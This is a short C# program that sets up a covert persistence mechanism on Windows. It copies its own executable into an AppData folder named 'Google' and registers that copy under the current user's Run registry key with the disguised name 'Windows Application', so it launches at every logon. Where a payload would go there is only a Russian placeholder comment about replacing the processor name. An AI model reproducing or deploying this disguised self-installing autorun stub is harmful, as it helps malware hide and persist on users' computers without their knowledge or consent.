using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace reflection
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern void ExitProcess([In] uint uExitCode);

        private static void Main()
        {
            var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Google",
                AssemblyProduct);
            if (!File.Exists(fileName))
            {
                File.Copy(AssemblyProduct, fileName); 
            }
            var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
            if (key != null) key.SetValue("Windows Application", fileName);
            Method();
        }
        private static void Method()
        {
            // сюда кидаем скрипт замены имени процессора 
            ExitProcess(0);
        }
        public static string AssemblyProduct
        {
            get
            {
                var attributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyProductAttribute), false);
                return attributes.Length == 0 ? "" : ((AssemblyProductAttribute)attributes[0]).Product + ".exe";
            }
        }
    }
}
